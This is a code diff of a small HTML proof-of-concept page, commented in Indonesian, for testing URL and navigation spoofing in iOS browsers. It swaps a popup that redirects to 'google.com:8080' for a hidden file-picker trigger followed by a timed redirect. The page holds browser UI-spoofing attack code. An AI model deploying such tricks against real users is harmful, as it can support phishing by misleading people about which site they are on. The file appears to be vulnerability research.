@@ -3,33 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS URL Spoofing PoC</title>
+    <title>File Picker Spoofing on iOS</title>
     <script>
-        function spoofURL() {
-            // Membuka tab baru dengan URL palsu
-            let newWindow = window.open("about:blank", "spoofWindow");  // Menggunakan 'about:blank'
-            
-            // Menulis konten dalam tab baru
-            newWindow.document.write("<h1>Hijacking Test</h1><p>If successful, we will see a spoofed URL.</p>");
+        // Fungsi untuk memicu file picker
+        function openFilePicker() {
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.accept = 'image/*';  // Misalnya hanya file gambar yang diterima
+            fileInput.style.display = 'none';
 
-            // Set timeout untuk ganti URL
-            setTimeout(function() {
-                // Mengubah URL tab baru setelah beberapa detik (misalnya 3 detik)
-                newWindow.location.replace('https://google.com:8080'); // URL spoofed dengan port
-            }, 3000); // Ganti URL setelah 3 detik
+            fileInput.addEventListener('change', (event) => {
+                const file = event.target.files[0];
+                if (file) {
+                    console.log('File selected:', file.name);
+                }
+            });
+
+            document.body.appendChild(fileInput);
+            fileInput.click();  // Memicu dialog file picker
         }
 
-        // Fungsi untuk memverifikasi jika pop-up berhasil
-        function verifyPopup() {
-            const popup = window.open('', 'spoofWindow');  // Mengakses tab yang sudah dibuka
-            if (!popup) {
-                alert("Pop-up diblokir! Harap aktifkan pop-up untuk menguji.");
-            }
+        // Fungsi untuk memanipulasi navigasi setelah file picker
+        function spoofNavigation() {
+            openFilePicker();  // Panggil file picker
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';  // Pindahkan halaman setelah memilih file
+            }, 1000);  // Menunggu 1 detik sebelum navigasi
         }
     </script>
 </head>
 <body>
-    <h1>Click to test URL spoofing with port</h1>
-    <button onclick="spoofURL(); verifyPopup();">Click to Test</button> <!-- Tombol untuk interaksi pengguna -->
+    <h1>Click anywhere to start the spoofing test</h1>
+    <script>
+        // Menunggu klik pengguna untuk memicu file picker
+        document.addEventListener('click', spoofNavigation);
+    </script>
 </body>
 </html>
